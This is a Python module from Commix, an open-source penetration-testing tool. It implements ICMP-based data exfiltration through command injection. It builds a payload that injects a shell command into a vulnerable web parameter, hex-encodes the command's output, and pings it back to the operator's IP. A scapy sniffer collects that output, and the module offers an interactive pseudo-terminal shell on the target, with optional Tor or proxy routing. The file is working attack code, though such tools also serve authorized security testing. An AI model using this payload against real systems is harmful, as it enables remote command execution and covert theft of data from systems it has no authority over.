#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import signal
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_client as _http_client
import threading
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters
from src.core.shells import reverse_tcp
from src.core.injections.controller import checks

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

readline_error = False
if settings.IS_WINDOWS:
  try:
    import readline
  except ImportError:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
else:
  try:
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
  except ImportError:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
pass



"""
The ICMP exfiltration technique: 
Exfiltrate data using the ping utility.

[1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
[2] http://blog.curesec.com/article/blog/23.html
"""

add_new_line = True
exfiltration_length = 8

def packet_handler(Packet):
  global add_new_line
  if Packet.haslayer(ICMP):
    Data = Packet.getlayer(ICMP).getlayer(Raw)
    exfiltrated_data = Data.load[int(exfiltration_length):].replace(exfiltration_length * "\n","\n")
    if exfiltrated_data.endswith("\n"):
      add_new_line = False
    sys.stdout.write(exfiltrated_data)
    sys.stdout.flush()

def signal_handler(signal, frame):
  sys.stdout.write(Style.RESET_ALL)
  exit(0)

def snif(ip_dst, ip_src):
  info_msg = "Started the sniffer between " + Fore.YELLOW + ip_src
  info_msg += Style.RESET_ALL + Style.BRIGHT + " and " + Fore.YELLOW 
  info_msg += ip_dst + Style.RESET_ALL + Style.BRIGHT + "."
  print(settings.print_bold_info_msg(info_msg))
  
  while True:
    sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.TIMESEC)
 
def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
  global add_new_line
  # ICMP exfiltration payload.
  payload = ("; " + cmd + " | xxd -p -c" + str(exfiltration_length) + " | while read line; do ping -p $line -c1 -s" + str(exfiltration_length * 2) + " -q " + ip_src + "; done")
  
  # Check if defined "--verbose" option.
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Executing the '" + cmd + "' command. "
    sys.stdout.write(settings.print_debug_msg(debug_msg))
    sys.stdout.flush()
    sys.stdout.write("\n" + settings.print_payload(payload) + "\n")
  if http_request_method == "GET":
    url = url.replace(settings.INJECT_TAG, "")
    data = payload.replace(" ", "%20")
    req = url + data
  else:
    values =  {vuln_parameter:payload}
    data = _urllib.parse.urlencode(values).encode(settings.UNICODE_ENCODING)
    request = _urllib.request.Request(url=url, data=data)

  try:
    sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    time.sleep(3)
    sys.stdout.write(Style.RESET_ALL)
    if add_new_line:
      print("\n")
      add_new_line = True
    else:
      print("")
      
  except _urllib.error.HTTPError as err_msg:
    print(settings.print_critical_msg(str(err_msg.code)))
    raise SystemExit()

  except _urllib.error.URLError as err_msg:
    print(settings.print_critical_msg(str(err_msg.args[0]).split("] ")[1] + "."))
    raise SystemExit()

  except _http_client.InvalidURL as err:
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):

  err_msg = ""
  if menu.enumeration_options():
    err_msg += "enumeration"
  if menu.file_access_options():
    if err_msg != "":
      err_msg = err_msg + " and "
    err_msg = err_msg + "file-access"

  if err_msg != "":
    warn_msg = "The " + err_msg + " options are not supported "
    warn_msg += "by this module because of the structure of the exfiltrated data. "
    warn_msg += "Please try using any unix-like commands manually."
    print(settings.print_warning_msg(warn_msg))

  # Pseudo-Terminal shell
  go_back = False
  go_back_again = False
  while True:
    if go_back == True:
      break
    if not menu.options.batch:  
      question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
      gotshell = _input(settings.print_question_msg(question_msg))
    else:
      gotshell = ""  
    if len(gotshell) == 0:
       gotshell= "Y"
    if gotshell in settings.CHOICE_YES:
      print("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
      if readline_error:
        checks.no_readline_module()
      while True:
        try:
          # Tab compliter
          if not readline_error:
            readline.set_completer(menu.tab_completer)
            # MacOSX tab compliter
            if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
              readline.parse_and_bind("bind ^I rl_complete")
            # Unix tab compliter
            else:
              readline.parse_and_bind("tab: complete")
          cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
          cmd = checks.escaped_cmd(cmd)
          if cmd.lower() in settings.SHELL_OPTIONS:
            if cmd.lower() == "quit" or cmd.lower() == "back":       
              print("")             
              os._exit(0)
            elif cmd.lower() == "?": 
              menu.os_shell_options()
            elif cmd.lower() == "os_shell": 
              warn_msg = "You are already into the '" + cmd.lower() + "' mode."
              print(settings.print_warning_msg(warn_msg))+ "\n"
            elif cmd.lower() == "reverse_tcp":
              warn_msg = "This option is not supported by this module."
              print(settings.print_warning_msg(warn_msg))+ "\n"
          else:
            # Command execution results.
            cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
        except KeyboardInterrupt:
          os._exit(1)
        except:
          print("")
          os._exit(0)
    elif gotshell in settings.CHOICE_NO:
      print("")
      os._exit(0)
    elif gotshell in settings.CHOICE_QUIT:
      print("")
      os._exit(0)
    else:
      err_msg = "'" + gotshell + "' is not a valid answer."
      print(settings.print_error_msg(err_msg))
      pass


def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique):
  # Check injection state
  settings.DETECTION_PHASE = False
  settings.EXPLOITATION_PHASE = True
  signal.signal(signal.SIGINT, signal_handler)
  sniffer_thread = threading.Thread(target=snif, args=(ip_dst, ip_src, )).start()
  time.sleep(2)
  if menu.options.os_cmd:
    cmd = menu.options.os_cmd
    cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
    print("")
    os._exit(0)
  else:
    input_cmd(http_request_method, url, vuln_parameter, ip_src, technique)

def icmp_exfiltration_handler(url, http_request_method):
  # Check injection state
  settings.DETECTION_PHASE = True
  settings.EXPLOITATION_PHASE = False
  # You need to have root privileges to run this script
  if os.geteuid() != 0:
    err_msg = "You need to have root privileges to run this option."
    print(settings.print_critical_msg(err_msg) + "\n")
    os._exit(0)

  if http_request_method == "GET":
    #url = parameters.do_GET_check(url)
    request = _urllib.request.Request(url)
    headers.do_check(request)
    vuln_parameter = parameters.vuln_GET_param(url)
    
  else:
    parameter = menu.options.data
    parameter = _urllib.parse.unquote(parameter)
    parameter = parameters.do_POST_check(parameter)
    request = _urllib.request.Request(url, parameter)
    headers.do_check(request)
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  else:
    try:
      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    except _urllib.error.HTTPError as err_msg:
      if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
        response = False  
      elif settings.IGNORE_ERR_MSG == False:
        err = str(err_msg) + "."
        print("\n" + settings.print_critical_msg(err))
        continue_tests = checks.continue_tests(err_msg)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  if settings.TARGET_OS == "win":
    err_msg = "This module's payloads are not suppoted by "
    err_msg += "the identified target operating system."
    print(settings.print_critical_msg(err_msg) + "\n")
    os._exit(0)

  else:
    technique = "ICMP exfiltration module"
    info_msg ="Loading the " + technique + ". \n"
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()

    ip_data = menu.options.ip_icmp_data

    #  Source IP address
    ip_src =  re.findall(r"ip_src=(.*),", ip_data)
    ip_src = ''.join(ip_src)

    # Destination IP address
    ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
    ip_dst = ''.join(ip_dst)
    
    exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)

if __name__ == "__main__":
  icmp_exfiltration_handler(url, http_request_method)

# eof